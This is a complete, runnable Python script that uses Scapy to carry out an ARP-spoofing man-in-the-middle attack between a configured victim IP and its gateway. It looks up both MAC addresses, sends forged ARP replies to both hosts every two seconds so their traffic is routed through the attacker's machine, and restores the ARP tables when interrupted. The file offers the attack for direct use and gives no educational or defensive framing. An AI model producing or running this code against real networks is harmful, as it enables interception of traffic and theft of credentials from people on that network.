from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
import time
import sys

# ---- CONFIGURE THESE ----
victim_ip = "10.112.40.94"           # IP of the victim machine
gateway_ip = "10.112.41.254"         # IP of the router/gateway
network_iface = "eth0"               

def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
        timeout=2,
        iface=network_iface,
        verbose=0
    )
    if ans:
        return ans[0][1].src
    else:
        print(f"[-] Could not find MAC for {ip}")
        return None

def get_attacker_mac():
    try:
        return get_if_hwaddr(network_iface)
    except Exception as e:
        print(f"[-] Could not get attacker's MAC address: {e}")
        sys.exit(1)

def spoof_arp(target_ip, spoof_ip):
    """
    Send a fake ARP reply to target_ip, claiming spoof_ip is at our MAC address.
    """
    target_mac = get_mac(target_ip)
    attacker_mac = get_attacker_mac()
    if not target_mac:
        print(f"[-] Cannot continue, target MAC not found.")
        return
    arp_packet = ARP(
        op=2,                # is-at (ARP reply)
        pdst=target_ip,      # Destination IP (who gets the ARP)
        hwdst=target_mac,    # Destination MAC (who gets the ARP)
        psrc=spoof_ip,       # The IP we're pretending to own
        hwsrc=attacker_mac   # Our MAC (attacker)
    )
    ether = Ether(dst=target_mac, src=attacker_mac)
    packet = ether / arp_packet
    sendp(packet, iface=network_iface, verbose=0)
    print(f"[+] Sent ARP spoof to {target_ip}: {spoof_ip} is-at {attacker_mac}")

def restore_arp(target_ip, real_ip):
    """
    Restore the correct ARP mapping for target_ip and real_ip.
    """
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    if target_mac and real_mac:
        arp_packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=real_ip,
            hwsrc=real_mac
        )
        ether = Ether(dst=target_mac, src=real_mac)
        packet = ether / arp_packet
        sendp(packet, count=5, iface=network_iface, verbose=0)
        print(f"[+] Restored ARP for {target_ip}: {real_ip} is-at {real_mac}")

if __name__ == "__main__":
    print(f"[*] Starting ARP MITM attack between {victim_ip} and {gateway_ip} (interface: {network_iface})")
    try:
        while True:
            # Spoof victim: "Gateway is at attacker MAC"
            spoof_arp(victim_ip, gateway_ip)
            # Spoof gateway: "Victim is at attacker MAC"
            spoof_arp(gateway_ip, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping attack and restoring ARP tables...")
        restore_arp(victim_ip, gateway_ip)
        restore_arp(gateway_ip, victim_ip)
        print("[*] Done. Network should recover shortly.")
